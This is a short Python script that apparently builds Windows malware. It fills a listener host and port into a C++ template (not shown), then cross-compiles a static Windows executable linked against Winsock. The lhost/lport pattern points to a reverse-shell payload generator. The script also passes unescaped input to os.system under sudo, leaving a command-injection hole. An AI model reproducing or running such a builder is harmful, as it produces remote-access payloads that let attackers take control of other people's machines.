#!/usr/bin/python3
import sys, os
import subprocess
import random as rand
from argparse import ArgumentParser, ArgumentTypeError
filepath=os.path.dirname(os.path.abspath(__file__))

args = ArgumentParser()
args.add_argument('-lhost', help='ip / host', nargs="?", const="1")
args.add_argument('-lport', help='port', nargs="?", const="1")
args.add_argument('-o','--output', help='output file', nargs="?", const="1")
ag=args.parse_args()

#
cppFileTet=""
with open(filepath+"/cppfinefilename.cpp") as f:
 cppFileTet=f.read()
#
#!
edg=cppFileTet.replace("ipconvict", '"'+ag.lhost+'"', 1).replace("portdave", ag.lport,1)
#!
##
rnd=str(rand.random()).replace(".", '',1)
ckp="~/zzeditsrc"+rnd+".cpp"
os.system("sudo echo '"+edg+"' > "+ckp)
##
#@
os.system("x86_64-w64-mingw32-g++ -o "+ag.output+" "+ckp+" -static-libstdc++ -static-libgcc -lws2_32")
#@
###$
os.system("sudo rm "+ckp)
###$
